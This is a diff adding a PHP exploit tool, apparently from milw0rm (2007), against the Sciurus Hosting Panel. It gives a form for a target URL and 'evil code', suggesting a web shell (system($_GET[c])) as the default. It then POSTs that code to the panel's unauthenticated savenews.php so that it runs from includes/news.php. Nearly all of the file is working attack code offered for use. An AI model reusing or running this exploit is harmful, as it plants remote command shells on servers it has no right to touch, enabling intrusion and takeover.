@@ -1,0 +1,66 @@
+<? ob_implicit_flush(true); ?>
+<style>
+body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;}
+input,
+.kbrtm,select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;}
+button{background-color: #666666; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
+body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}  
+textarea{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; border-left:1px solid #121212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;}
+a:link {
+	color: #999999;
+	text-decoration: none;
+        font-weight: bold;
+	background-color:#000000;
+}
+a:visited {
+	color: #999999;
+	text-decoration: none;
+        font-weight: bold;
+	background-color:#000000;
+}
+</style><br>
+<center>
+<h3>Sciurus Hosting Panel Code İnject Exploit</h3><br>
+Exploit Coded By Liz0ziM From <a href="http://www.biyofrm.com">BiyoSecurityTeam</a><br>
+Greetz My all friend and BiyoSecurityTeam User..
+<br>
+<form method="POST" action="">
+<input name="adres" type="text" value="Target  example: http://www.site.com/" size="70" onFocus="if(this.value=='Target  example: http://www.site.com/')this.value=''" onBlur="if(this.value=='')this.value='Target  example: http://www.site.com/'">
+<input name="kodcuk" type="text" value="Evil Code  example:  &lt;? system($_GET[c]); ?&gt;" size="70" onFocus="if(this.value=='Evil Code  example:  &lt;? system($_GET[c]); ?&gt;')this.value=''" onBlur="if(this.value=='')this.value='Evil Code  example:  &lt;? system($_GET[c]); ?&gt;'">
+<input name="yolla" type="submit" value="Send Evil Code">
+</form>
+
+<br>
+<?php
+if($_POST[yolla])
+{
+$adres=$_POST[adres];
+$kodcuk=$_POST[kodcuk];
+if($adres=="" OR $kodcuk=="") { echo 'Boş Yerleri Doldurun'; exit(); }
+echo 'Target= '.htmlspecialchars($adres)."<br>";
+sleep(1);
+echo 'Evil Code= '.htmlspecialchars($kodcuk)."<br>";
+sleep(1);
+echo 'Sending Evil Code.......<br>';
+$paket1=$adres."/acp/savenews.php";
+$paket2="filecontents=".$kodcuk;
+$ch = curl_init();
+
+/* <pre><b><? system($_GET[c]); ?></b></pre> */
+curl_setopt($ch, CURLOPT_URL, $paket1);
+
+curl_setopt ($ch, CURLOPT_POST, 1);
+
+curl_setopt ($ch, CURLOPT_POSTFIELDS, stripslashes($paket2));
+
+curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+
+$content = curl_exec ($ch);
+curl_close ($ch); 
+sleep(5);
+echo "Exploit Has Been Succeful : <a target='_blank' href='".$adres."/includes/news.php'>".$adres."/includes/news.php</a>";
+}
+?>
+</center>
+
+# milw0rm.com [2007-11-18]
